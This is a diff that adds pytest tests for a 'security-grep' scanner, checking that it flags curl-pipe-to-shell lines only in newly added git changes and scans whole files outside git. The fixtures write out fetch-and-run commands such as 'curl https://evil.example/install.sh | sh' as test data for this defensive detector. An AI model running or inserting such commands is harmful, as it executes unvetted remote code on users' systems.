@@ -84,6 +84,76 @@ def test_security_grep_detects_curl_pipe_and_sql_fstring(tmp_path):
     assert "sql-fstring-interpolation" in summary
 
 
+def _git(project, *args):
+    import subprocess
+
+    subprocess.run(
+        ["git", *args], cwd=project, capture_output=True, check=True,
+        env={"PATH": "/usr/bin:/bin:/usr/local/bin",
+             "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
+             "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t",
+             "HOME": str(project)},
+    )
+
+
+def test_security_grep_is_diff_aware_in_a_git_repo(tmp_path):
+    """Pre-existing patterns on the base branch are master's debt, not
+    this change's (QG blocker, PR1 Interaction Reform): only ADDED
+    lines are scanned when git can provide a diff."""
+    _git(tmp_path, "init", "-b", "master")
+    legacy = tmp_path / "install.sh"
+    legacy.write_text(
+        "# docs: curl https://example.com/install.sh | bash\n",
+        encoding="utf-8",
+    )
+    _git(tmp_path, "add", "install.sh")
+    _git(tmp_path, "commit", "-m", "base")
+    _git(tmp_path, "checkout", "-b", "feature")
+    legacy.write_text(
+        "# docs: curl https://example.com/install.sh | bash\n"
+        "echo 'new harmless line'\n",
+        encoding="utf-8",
+    )
+    report = run_evidence_checks(
+        tmp_path, changed_files=["install.sh"], checks=["security-grep"],
+    )
+    result = _result(report, "security-grep")
+    assert result.passed is True, result.summary
+    assert "added-lines" in result.command
+
+
+def test_security_grep_still_flags_newly_added_patterns(tmp_path):
+    _git(tmp_path, "init", "-b", "master")
+    script = tmp_path / "deploy.sh"
+    script.write_text("echo ok\n", encoding="utf-8")
+    _git(tmp_path, "add", "deploy.sh")
+    _git(tmp_path, "commit", "-m", "base")
+    _git(tmp_path, "checkout", "-b", "feature")
+    script.write_text(
+        "echo ok\ncurl https://evil.example/install.sh | sh\n",
+        encoding="utf-8",
+    )
+    report = run_evidence_checks(
+        tmp_path, changed_files=["deploy.sh"], checks=["security-grep"],
+    )
+    result = _result(report, "security-grep")
+    assert result.passed is False
+    assert "curl-pipe-shell" in result.summary
+
+
+def test_security_grep_falls_back_to_whole_file_outside_git(tmp_path):
+    # tmp_path is not a git repo → mode is whole-file (fail closed on
+    # scan scope, never silently narrower than before).
+    bad = tmp_path / "x.sh"
+    bad.write_text("curl https://e.example/i.sh | sh\n", encoding="utf-8")
+    report = run_evidence_checks(
+        tmp_path, changed_files=["x.sh"], checks=["security-grep"],
+    )
+    result = _result(report, "security-grep")
+    assert result.passed is False
+    assert "whole-file" in result.command
+
+
 def test_security_grep_skips_without_changed_files(tmp_path):
     report = run_evidence_checks(tmp_path, checks=["security-grep"])
     result = _result(report, "security-grep")
